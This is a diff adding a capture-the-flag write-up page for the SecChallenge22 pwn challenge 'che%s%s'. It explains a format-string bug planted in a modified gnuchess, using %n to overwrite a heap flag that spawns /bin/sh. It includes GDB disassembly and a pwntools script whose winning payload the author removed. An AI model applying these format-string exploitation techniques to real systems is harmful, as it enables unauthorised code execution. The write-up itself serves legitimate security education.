@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>che%s%s | m4rcix</title>
+<meta name="generator" content="Jekyll v3.9.1" />
+<meta property="og:title" content="che%s%s" />
+<meta name="author" content="m4rcix" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Who doesn&#39;t love a good game a chess?" />
+<meta property="og:description" content="Who doesn&#39;t love a good game a chess?" />
+<link rel="canonical" href="https://m4rcix.github.io/sc22/pwn/chess" />
+<meta property="og:url" content="https://m4rcix.github.io/sc22/pwn/chess" />
+<meta property="og:site_name" content="m4rcix" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-03-16T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="che%s%s" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"m4rcix"},"dateModified":"2022-03-16T00:00:00+00:00","datePublished":"2022-03-16T00:00:00+00:00","description":"Who doesn&#39;t love a good game a chess?","headline":"che%s%s","mainEntityOfPage":{"@type":"WebPage","@id":"https://m4rcix.github.io/sc22/pwn/chess"},"url":"https://m4rcix.github.io/sc22/pwn/chess"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://m4rcix.github.io/feed.xml" title="m4rcix" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">m4rcix<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/MarcixWasTaken"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://www.twitch.tv/marcix"><i class="fab fa-twitch"></i></a>
+        
+        
+        
+        <a class="color-red-hover" href="https://www.youtube.com/channel/UChaUSPtWwNkUpzrjUW7H0PA"><i class="fab fa-youtube"></i></a>
+        
+        
+        
+        <a class="color-yellow-hover" href="https://github.com/m4rcix"><i class="fab fa-github-square"></i></a>
+        
+        
+        
+        <a class="color-blue-hover" href="https://www.linkedin.com/in/marton-bak-574a59201/"><i class="fab fa-linkedin"></i></a>
+        
+        
+        
+        <a class="color-green-hover" href="https://app.hackthebox.eu/profile/367067"><i class="fa fa-cube"></i></a>
+        
+        
+        
+        <a class="color-blue-hover" href="https://discord.com/invite/wGHG5Aj"><i class="fab fa-discord"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+<div class="post">
+  <h1 class="post-title">che%s%s</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/pwn/">pwn</a>
+      
+      <a class="tag" href="/tag/secchallenge22/">secchallenge22</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 16 Mar 2022</div>
+  
+  <noscript>
+    <div class="post-description">Who doesn\'t love a good game a chess?</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <h2 id="description">Description</h2>
+
+<p>Ohh no! Someone just broke into our system!</p>
+
+<p>Ok, now they are stealing the source code of our unbeatable che%s%s engine. Aaaand we are locked out of our che%s%s service…</p>
+
+<p>We managed to capture their modified source code while the bad folks uploaded a new version of our software.</p>
+
+<p>Could you help us get inside again?</p>
+
+<p><code class="language-plaintext highlighter-rouge">nc chess.secchallenge.crysys.hu 5017</code></p>
+
+<ul>
+  <li>Author: tcs</li>
+  <li>Attachments: <a href="/media/sc22/pwn/chess/chess">chess</a>, <a href="/media/sc22/pwn/chess/chess-src.tar.gz">chess-src.tar.gz</a></li>
+</ul>
+
+<h2 id="solution">Solution</h2>
+
+<h3 id="0x1-basic-information">0x1 basic information</h3>
+
+<p>Just based on the title of the challenge, one can assume, that we are looking at a format string vulnerability.</p>
+
+<p>Since we are given the source code of the challenge, we can quickly identify, that it is a modified version of <code class="language-plaintext highlighter-rouge">gnuchess-6.2.9</code>. Pulling the original source, and diffing it to the “leaked” source, we can see, that the following parts were modified:</p>
+
+<p>In <code class="language-plaintext highlighter-rouge">main.cc</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="o">*</span><span class="n">solved</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+
+<span class="p">...</span>
+
+<span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">solved</span> <span class="o">==</span> <span class="mh">0xb055</span><span class="p">){</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>and in <code class="language-plaintext highlighter-rouge">frontend/engine.cc</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">engineinput</span><span class="p">,</span> <span class="s">"1-0 {White mates}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Congrats! Here is your reward:"</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>What we are looking at here, is an arbitrary memory write using <code class="language-plaintext highlighter-rouge">printf</code>.
+In a nutshell, format strings work in the following way:</p>
+
+<p>If you supply format characters in the format string part of the function call, the function will expect, that you have placed the variables on the stack according to the format characters. What if not? You are leaking the stack of your program.</p>
+
+<p>But how can we write data? This is where the <code class="language-plaintext highlighter-rouge">%n</code> format character comes into play. If you look up the manpage of <code class="language-plaintext highlighter-rouge">printf</code> for example, it says:</p>
+
+<blockquote>
+  <p>The  number  of  characters written so far is stored into the integer pointed to by the corresponding argument.  That argument shall be an int *, or variant whose size matches  the  (optionally)  supplied  integer length modifier.  No argument is converted.  (This specifier is not supported by the bionic C library.)   The  behavior is  undefined if the conversion specification includes any flags, a field width, or a precision.</p>
+</blockquote>
+
+<p>And luckily for us, the <code class="language-plaintext highlighter-rouge">solved</code> variable is an <code class="language-plaintext highlighter-rouge">int *</code>, so we have everything in order to exploit the code, and get a shell.</p>
+
+<h3 id="0x2-exploit">0x2 exploit</h3>
+
+<p>Since we are playing a proper chess engine, even when setting the <code class="language-plaintext highlighter-rouge">depth</code> of the engine to <code class="language-plaintext highlighter-rouge">1</code> gives us a tough opponent. So obviously we just get another, preferably better, engine to play for us. For this I chose <a href="https://stockfishchess.org/">stockfish</a>, which is a well-known engine, and after a bit of googling I set it up using <a href="https://pypi.org/project/PyChess/">pychess</a>.</p>
+
+<p>Implementing basic I/O communication as usual, and we have a stable way of getting to the part, where we can exploit the format string.</p>
+
+<p>The creators of the challenge were kind enough to put the <code class="language-plaintext highlighter-rouge">solved</code> variable onto the stack. We only had to figure out, where exactly it is.
+This is the part where <code class="language-plaintext highlighter-rouge">GDB</code> came in handy. Breaking at the <code class="language-plaintext highlighter-rouge">printf</code> call, we can examine the stack. 
+Looking at the trace, we can see that we are one function call deep from main, namely inside <code class="language-plaintext highlighter-rouge">NextEngineCmd()</code>.  Disassemblying it, we can see, that it actually allocates quite a huge stackframe:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x000055555556a8d1 &lt;+4&gt;:    push   rbp
+   0x000055555556a8d2 &lt;+5&gt;:    mov    rbp,rsp
+   0x000055555556a8d5 &lt;+8&gt;:    sub    rsp,0x1000
+</code></pre></div></div>
+<p>This means, that the solved variable will be quite far from us. To find its exact location we can break at the line in <code class="language-plaintext highlighter-rouge">main</code> where the variable gets compared:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x000055555555984d &lt;+2780&gt;:    mov    rax,QWORD PTR [rbp-0x1d8]
+   0x0000555555559854 &lt;+2787&gt;:    mov    eax,DWORD PTR [rax]
+   0x0000555555559856 &lt;+2789&gt;:    cmp    eax,0xb055
+   0x000055555555985b &lt;+2794&gt;:    jne    0x555555559873 &lt;main+2818&gt;
+   0x000055555555985d &lt;+2796&gt;:    lea    rdi,[rip+0x4395d]        # 0x55555559d1c1
+   0x0000555555559864 &lt;+2803&gt;:    call   0x555555558810 &lt;system@plt&gt;
+</code></pre></div></div>
+<p>From here, we can use the <code class="language-plaintext highlighter-rouge">x/Ngx $rsp</code> syntax, where <code class="language-plaintext highlighter-rouge">N</code> is a positive integer in order to find the pointer of <code class="language-plaintext highlighter-rouge">solved</code>. (You are looking for a heap address on the stack).</p>
+
+<p>If you found the <code class="language-plaintext highlighter-rouge">N</code>, you know where your your variable is, which you have to overwrite. Since it will be quite far, and your format string is limited to ~50 characters, you will have to use another trick, to directly access any “argument” of the stack (Look into the <code class="language-plaintext highlighter-rouge">%N$p</code> syntax). Since the call to <code class="language-plaintext highlighter-rouge">printf</code> will also allocate some memory on the stack, you will have to find the exact position using the format string vuln, and dumping the memory around the offset using the aforementioned syntax, until you find the exact position.</p>
+
+<p>The script I wrote to solve this challenge automates everything except finding the offset, but to not give the students an instant solution I will remove the winning format string from my code.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">chess</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">chess.engine</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">signal</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="c1"># exit gracefully on Ctrl + C
+</span><span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+	<span class="n">engine</span><span class="p">.</span><span class="n">quit</span><span class="p">()</span>
+	<span class="nb">exit</span><span class="p">()</span>
+
+<span class="c1"># register signal handler
+</span><span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>
+
+<span class="n">pr</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"White winning"</span><span class="p">)</span>
+
+<span class="c1"># set up board and stockfish
+</span><span class="n">engine</span> <span class="o">=</span> <span class="n">chess</span><span class="p">.</span><span class="n">engine</span><span class="p">.</span><span class="n">SimpleEngine</span><span class="p">.</span><span class="n">popen_uci</span><span class="p">(</span><span class="s">"/usr/games/stockfish"</span><span class="p">)</span>
+<span class="n">limit</span> <span class="o">=</span> <span class="n">chess</span><span class="p">.</span><span class="n">engine</span><span class="p">.</span><span class="n">Limit</span><span class="p">(</span><span class="n">depth</span><span class="o">=</span><span class="mi">14</span><span class="p">)</span>
+<span class="n">board</span> <span class="o">=</span> <span class="n">chess</span><span class="p">.</span><span class="n">Board</span><span class="p">()</span>
+
+<span class="c1">#with process(["gdb", "./chess"]) as p:
+</span>	<span class="c1">#p.sendline(b'b *NextEngineCmd+931')
+</span>	<span class="c1">#p.sendline(b'r')
+</span><span class="k">with</span> <span class="n">remote</span><span class="p">(</span><span class="s">"chess.secchallenge.crysys.hu"</span><span class="p">,</span> <span class="mi">5017</span><span class="p">)</span> <span class="k">as</span> <span class="n">p</span><span class="p">:</span>
+	<span class="c1"># initial setup, nerfing the chall
+</span>	<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'White (1) : '</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
+	<span class="n">success</span><span class="p">(</span><span class="s">"Nerfed challenge to oblivion"</span><span class="p">)</span>
+	<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"depth 1"</span><span class="p">)</span>
+	<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'White (1) : '</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
+	<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">WIN</span><span class="p">)</span>
+	<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'White (1) : '</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
+
+	<span class="n">movecount</span> <span class="o">=</span> <span class="mi">1</span>
+
+	<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+
+		<span class="c1"># get the next engine move
+</span>		<span class="n">engine_ret</span> <span class="o">=</span> <span class="n">engine</span><span class="p">.</span><span class="n">play</span><span class="p">(</span><span class="n">board</span><span class="p">,</span> <span class="n">limit</span><span class="p">,</span> <span class="n">info</span><span class="o">=</span><span class="n">chess</span><span class="p">.</span><span class="n">engine</span><span class="p">.</span><span class="n">Info</span><span class="p">.</span><span class="n">SCORE</span><span class="p">)</span>
+		<span class="n">pr</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">engine_ret</span><span class="p">.</span><span class="n">info</span><span class="p">[</span><span class="s">'score'</span><span class="p">].</span><span class="n">white</span><span class="p">()))</span>
+
+		<span class="c1"># send engine move to the challenge
+</span>		<span class="n">san_move</span> <span class="o">=</span> <span class="n">board</span><span class="p">.</span><span class="n">san</span><span class="p">(</span><span class="n">engine_ret</span><span class="p">.</span><span class="n">move</span><span class="p">)</span>
+
+		<span class="c1"># if we checkmate, go interactive
+</span>		<span class="k">if</span> <span class="s">"#"</span> <span class="ow">in</span> <span class="n">san_move</span><span class="p">:</span>
+			<span class="c1">#print(f"Winning move: {san_move}")
+</span>			<span class="c1">#p.interactive()
+</span>			<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">san_move</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+			<span class="n">pr</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"White checkmates"</span><span class="p">)</span>
+			<span class="n">rec</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'White (</span><span class="si">{</span><span class="n">movecount</span><span class="si">}</span><span class="s">) : '</span>
+			<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">rec</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">decode</span><span class="p">()</span>
+			<span class="n">success</span><span class="p">(</span><span class="s">"Enjoy your shell"</span><span class="p">)</span>
+			<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+		<span class="c1"># if not checkmate, let it play it out
+</span>		<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">san_move</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+
+		<span class="c1"># update local board
+</span>		<span class="n">board</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="n">engine_ret</span><span class="p">.</span><span class="n">move</span><span class="p">)</span>
+
+		<span class="n">movecount</span> <span class="o">+=</span> <span class="mi">1</span>
+
+		<span class="c1"># wait for the next prompt
+</span>		<span class="n">rec</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'White (</span><span class="si">{</span><span class="n">movecount</span><span class="si">}</span><span class="s">) : '</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">rec</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">decode</span><span class="p">()</span>
+		<span class="n">parsed_move</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'My move is : .*\n'</span><span class="p">,</span> <span class="n">answer</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">strip</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+
+		<span class="c1"># push the move received to the board
+</span>		<span class="n">board</span><span class="p">.</span><span class="n">push_san</span><span class="p">(</span><span class="n">parsed_move</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The acquired flag is:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd22{HIDDEN}
+</code></pre></div></div>
+
+<p><a href="/sc22">← Back to SecChallenge22</a></p>
+
+</div>
+
+
+
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/ctf/" class="set-1">CTF</a> <a href="/tag/crypto/" class="set-1">crypto</a> <a href="/tag/crysys/" class="set-1">crysys</a> <a href="/tag/dnspy/" class="set-1">dnSpy</a> <a href="/tag/hardware/" class="set-3">hardware</a> <a href="/tag/misc/" class="set-3">misc</a> <a href="/tag/pwn/" class="set-2">pwn</a> <a href="/tag/reverse/" class="set-2">reverse</a> <a href="/tag/secchallenge/" class="set-5">secchallenge</a> <a href="/tag/secchallenge22/" class="set-5">secchallenge22</a> <a href="/tag/web/" class="set-4">web</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = 'Who doesn\'t love a good game a chess?';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
